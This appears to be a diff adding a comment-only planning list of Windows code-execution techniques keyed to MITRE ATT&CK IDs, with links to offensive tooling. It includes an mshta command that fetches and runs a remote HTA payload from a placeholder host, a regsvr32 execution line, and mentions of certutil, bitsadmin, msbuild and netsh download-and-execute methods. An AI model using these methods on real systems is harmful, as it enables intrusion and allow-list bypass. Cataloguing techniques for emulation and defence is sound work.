@@ -1,0 +1,40 @@
+# MITRE ID: T1117
+# Execute dll via regsvr32.exe: regsvr32.exe artifact.dll
+# Execute exe via regsvr32.exe: regsvr32.exe artifact.exe
+# Drop exe on a host, execute remote script which executes the dropped exe via regsvr32.exe: https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/
+#
+# MITRE ID: T1170
+# Execute hta file via mshta: mshta http://webserver/payload[.]hta
+#
+# MITRE ID: T1047
+# Execute command via WMI: https://github.com/FortyNorthSecurity/WMIOps
+# Transfer executable and execute via WMI: https://github.com/FortyNorthSecurity/WMIOps
+# Execute powershell script via WMI: https://github.com/secabstraction/WmiSploit
+#
+# MITRE ID: T1028
+# Execute exe via WinRM
+# Execute powershell via WinRM
+#
+# MITRE ID: T1191
+# Execute exe via CMSTP
+# Execute powershell via CMSTP
+#
+# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md
+# https://github.com/pwndizzle/CodeExecutionOnWindows
+# Execute powershell via cscript/wscript
+# Execute powershell via certutil
+# Execute powershell via bitsadmin
+# Execute exe via cscript/wscript
+# Execute exe via certutil
+# Execute exe via bitsadmin
+# Execute exe via msbuild
+# Execute exe via msiexec
+#
+# MITRE ID: T1197
+# Download and execute exe via Bitsadmin
+# Download and execute exe via Bits PowerShell
+# Download and execute PowerShell via Bitsadmin
+# Download and execute PowerShell via Bits PowerShell
+#
+# MITRE ID: T1128
+# Execute dll via netsh: https://github.com/outflanknl/NetshHelperBeacon
